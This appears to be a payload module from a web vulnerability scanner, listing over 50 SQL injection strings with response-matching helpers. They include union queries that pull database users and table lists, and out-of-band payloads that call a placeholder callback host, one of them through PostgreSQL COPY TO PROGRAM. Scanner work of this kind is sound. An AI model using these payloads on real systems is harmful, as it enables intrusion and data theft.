"""
scanner/payloads/sqli.py

SQL Injection payloads for vulnerability testing.
Includes: Error-based, Boolean-based, Union-based, Time-based blind,
Out-of-band, Second-order indicators, Encoding bypasses, WAF bypasses,
Database-specific, and JSON/XML context payloads.

Total: 50+ payloads for comprehensive SQLi testing.
"""

from .base import Payload


def sqli_error_confirm(response_text: str) -> bool:
    """
    Check for SQL error messages in response.
    Comprehensive list covering multiple database types.
    """
    errors = [
        # MySQL
        "sql syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "mysql_query",
        "mysqli_",
        "you have an error in your sql syntax",
        "supplied argument is not a valid mysql",
        "mysql server version",

        # PostgreSQL
        "pg_query",
        "pg_exec",
        "postgresql",
        "psql:",
        "invalid input syntax for",
        "unterminated quoted string",

        # SQLite
        "sqlite_",
        "sqlite3::",
        "sqlite error",
        "unrecognized token",
        "unable to open database",

        # Microsoft SQL Server
        "mssql_",
        "odbc sql server driver",
        "microsoft ole db provider for sql server",
        "unclosed quotation mark",
        "incorrect syntax near",
        "sql server",

        # Oracle
        "ora-01756",
        "ora-00933",
        "ora-00936",
        "ora-00942",
        "oracle error",
        "quoted string not properly terminated",
        "invalid sql statement",

        # Generic
        "syntax error",
        "query failed",
        "database error",
        "sql error",
        "warning: ",
        "fatal error:",
        "invalid query",
        "unexpected end of sql",
    ]

    text_lower = response_text.lower()
    return any(e.lower() in text_lower for e in errors)


def sqli_boolean_confirm(response_text: str) -> bool:
    """
    Check for boolean-based SQLi indicators.
    Look for typical true/false response patterns.
    """
    # This is tricky - mainly used in conjunction with baseline comparison
    # Return False here; the VulnerabilityTester handles length comparison
    return False


def sqli_union_confirm(response_text: str) -> bool:
    """Check for UNION-based SQLi success indicators."""
    indicators = [
        # Common column names that might leak
        "username", "password", "email", "user_id",
        "admin", "root", "information_schema",
        # Version strings
        "mysql", "postgresql", "sqlite", "microsoft sql server",
    ]
    text_lower = response_text.lower()
    # Only confirm if we see unusual database info
    for ind in ["information_schema", "mysql.user", "sqlite_master"]:
        if ind in text_lower:
            return True
    return False


def sqli_time_confirm(response_text: str) -> bool:
    """
    Check for time-based SQLi indicators.
    Note: Actual time delay detection is handled by VulnerabilityTester
    by measuring response time differences.
    """
    # Time-based detection relies on response timing, not content
    # The VulnerabilityTester measures delay
    return False


def sqli_oob_confirm(response_text: str) -> bool:
    """
    Check for out-of-band SQLi indicators.
    OOB detection requires external infrastructure (DNS/HTTP callbacks).
    This is a placeholder for the scanner's OOB detection system.
    """
    # OOB detection requires external callback server
    return False


def sqli_second_order_confirm(response_text: str) -> bool:
    """
    Check for second-order SQLi indicators.
    Second-order SQLi manifests in subsequent requests.
    """
    # Second-order detection is complex and context-dependent
    return sqli_error_confirm(response_text)


SQLI_PAYLOADS = [
    # ============================================
    # ERROR-BASED SQLi
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="Single quote",
        payload="'",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Double quote",
        payload='"',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Backslash",
        payload="\\",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Comment injection",
        payload="1'--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Comment with space",
        payload="1' -- -",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Parenthesis break",
        payload="1')",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Double parenthesis",
        payload="1'))",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # BOOLEAN-BASED SQLi
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="OR true (single quote)",
        payload="' OR '1'='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="OR true (double quote)",
        payload='" OR "1"="1',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="OR true (no quotes)",
        payload="1 OR 1=1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_boolean_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="AND true",
        payload="1' AND '1'='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_boolean_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="AND false",
        payload="1' AND '1'='2",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_boolean_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="OR true closed",
        payload="' OR '1'='1'--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_boolean_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="OR true numeric",
        payload="' OR 1=1--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_boolean_confirm
    ),

    # ============================================
    # UNION-BASED SQLi
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="UNION SELECT NULL (1 col)",
        payload="' UNION SELECT NULL--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="UNION SELECT NULL (2 cols)",
        payload="' UNION SELECT NULL,NULL--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="UNION SELECT NULL (3 cols)",
        payload="' UNION SELECT NULL,NULL,NULL--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="UNION SELECT NULL (4 cols)",
        payload="' UNION SELECT NULL,NULL,NULL,NULL--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="UNION SELECT NULL (5 cols)",
        payload="' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="UNION with version",
        payload="' UNION SELECT @@version--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="UNION ALL SELECT",
        payload="' UNION ALL SELECT NULL,NULL,NULL--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="ORDER BY enumeration",
        payload="' ORDER BY 1--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="ORDER BY high column",
        payload="' ORDER BY 100--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # TIME-BASED BLIND SQLi
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="MySQL SLEEP",
        payload="' AND SLEEP(5)--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_time_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MySQL SLEEP OR",
        payload="' OR SLEEP(5)--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_time_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MySQL BENCHMARK",
        payload="' AND BENCHMARK(10000000,SHA1('test'))--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_time_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MSSQL WAITFOR",
        payload="'; WAITFOR DELAY '0:0:5'--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_time_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MSSQL WAITFOR conditional",
        payload="' IF 1=1 WAITFOR DELAY '0:0:5'--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_time_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="PostgreSQL pg_sleep",
        payload="'; SELECT pg_sleep(5)--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_time_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="PostgreSQL pg_sleep OR",
        payload="' OR pg_sleep(5)--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_time_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Oracle DBMS_PIPE.RECEIVE_MESSAGE",
        payload="' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_time_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="SQLite randomblob delay",
        payload="' AND 1=randomblob(500000000)--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_time_confirm
    ),

    # ============================================
    # OUT-OF-BAND SQLi (DNS Exfiltration Placeholders)
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="MySQL OOB DNS (LOAD_FILE)",
        payload="' UNION SELECT LOAD_FILE('\\\\\\\\{{CALLBACK}}.oob.example.com\\\\a')--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_oob_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MSSQL OOB DNS (xp_dirtree)",
        payload="'; EXEC master..xp_dirtree '\\\\{{CALLBACK}}.oob.example.com\\a'--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_oob_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MSSQL OOB DNS (xp_fileexist)",
        payload="'; EXEC master..xp_fileexist '\\\\{{CALLBACK}}.oob.example.com\\a'--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_oob_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Oracle OOB DNS (UTL_HTTP)",
        payload="' UNION SELECT UTL_HTTP.REQUEST('http://{{CALLBACK}}.oob.example.com/') FROM DUAL--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_oob_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Oracle OOB DNS (UTL_INADDR)",
        payload="' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('{{CALLBACK}}.oob.example.com') FROM DUAL--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_oob_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="PostgreSQL OOB (COPY)",
        payload="'; COPY (SELECT '') TO PROGRAM 'nslookup {{CALLBACK}}.oob.example.com'--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_oob_confirm
    ),

    # ============================================
    # SECOND-ORDER SQLi INDICATORS
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="Second-order single quote",
        payload="test'user",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_second_order_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Second-order payload storage",
        payload="admin'--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_second_order_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Second-order OR injection",
        payload="user' OR '1'='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_second_order_confirm
    ),

    # ============================================
    # ENCODING BYPASS VARIATIONS
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="URL encoded single quote",
        payload="%27",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Double URL encoded quote",
        payload="%2527",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Hex encoded OR",
        payload="1' %4F%52 '1'='1",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Unicode quote U+0027",
        payload="\u0027",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Unicode fullwidth quote",
        payload="\uff07",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Hex literal injection",
        payload="1' AND 0x313d31--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MySQL hex string",
        payload="' UNION SELECT 0x61646d696e--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="URL encoded double quote",
        payload="%22",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Double URL encoded double quote",
        payload="%2522",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # WAF BYPASS PAYLOADS
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="MySQL inline comment bypass",
        payload="1'/**/OR/**/1=1/**/--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Case variation OR",
        payload="' oR '1'='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Case variation UNION",
        payload="' uNiOn SeLeCt NULL--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Tab whitespace bypass",
        payload="'\tOR\t'1'='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Newline whitespace bypass",
        payload="'\nOR\n'1'='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MySQL version comment bypass",
        payload="'/*!50000OR*/ '1'='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Double dash space comment",
        payload="' OR 1=1-- -",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Hash comment bypass",
        payload="' OR 1=1#",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="C-style comment OR",
        payload="'/**/OR/**/1=1/**/",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Concat bypass (MySQL)",
        payload="' OR CONCAT('1','1')='11",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # DATABASE-SPECIFIC: MySQL
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="MySQL information_schema",
        payload="' UNION SELECT table_name FROM information_schema.tables--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MySQL user extraction",
        payload="' UNION SELECT user FROM mysql.user--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MySQL database()",
        payload="' UNION SELECT database()--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MySQL version()",
        payload="' UNION SELECT version()--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),

    # ============================================
    # DATABASE-SPECIFIC: PostgreSQL
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="PostgreSQL casting error",
        payload="1'::int",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="PostgreSQL version",
        payload="' UNION SELECT version()--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="PostgreSQL current_user",
        payload="' UNION SELECT current_user--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="PostgreSQL pg_tables",
        payload="' UNION SELECT tablename FROM pg_tables--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="PostgreSQL string concatenation",
        payload="' || 'injected' || '",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # DATABASE-SPECIFIC: MSSQL
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="MSSQL @@version",
        payload="' UNION SELECT @@version--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MSSQL system_user",
        payload="' UNION SELECT system_user--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MSSQL sysobjects",
        payload="' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MSSQL stacked query",
        payload="'; SELECT 1--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MSSQL string concat",
        payload="' + 'injected' + '",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # DATABASE-SPECIFIC: Oracle
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="Oracle DUAL table",
        payload="' UNION SELECT NULL FROM DUAL--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Oracle banner",
        payload="' UNION SELECT banner FROM v$version--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Oracle all_tables",
        payload="' UNION SELECT table_name FROM all_tables--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Oracle user extraction",
        payload="' UNION SELECT username FROM all_users--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Oracle string concat",
        payload="' || 'injected' || '",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # DATABASE-SPECIFIC: SQLite
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="SQLite sqlite_master",
        payload="' UNION SELECT name FROM sqlite_master--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="SQLite version",
        payload="' UNION SELECT sqlite_version()--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="SQLite table schema",
        payload="' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="SQLite string concat",
        payload="' || 'injected",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # JSON CONTEXT INJECTIONS
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="JSON value injection",
        payload='","injection":"true',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="JSON SQLi in value",
        payload="' OR '1'='1",
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="JSON array break",
        payload='"],"injection":["true',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="JSON numeric injection",
        payload="1 OR 1=1",
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=sqli_boolean_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="JSON nested object break",
        payload='"},"injection":{"a":"b',
        contexts=["json"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # XML CONTEXT INJECTIONS
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="XML attribute injection",
        payload="' OR '1'='1",
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="XML CDATA injection",
        payload="]]>' OR '1'='1/*",
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="XML element break",
        payload="</value>' OR '1'='1--<value>",
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="XML comment injection",
        payload="-->' OR '1'='1<!--",
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # STACKED QUERIES (Additional variants)
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="Stacked query semicolon",
        payload="'; SELECT 1;--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Stacked query MySQL",
        payload="'; SELECT SLEEP(0);--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_error_confirm
    ),

    # ============================================
    # ADDITIONAL ERROR-BASED (Extended)
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="MySQL extractvalue error",
        payload="' AND extractvalue(1,concat(0x7e,version()))--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MySQL updatexml error",
        payload="' AND updatexml(1,concat(0x7e,version()),1)--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="MSSQL convert error",
        payload="' AND 1=CONVERT(int,@@version)--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Oracle XMLType error",
        payload="' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_error_confirm
    ),
]
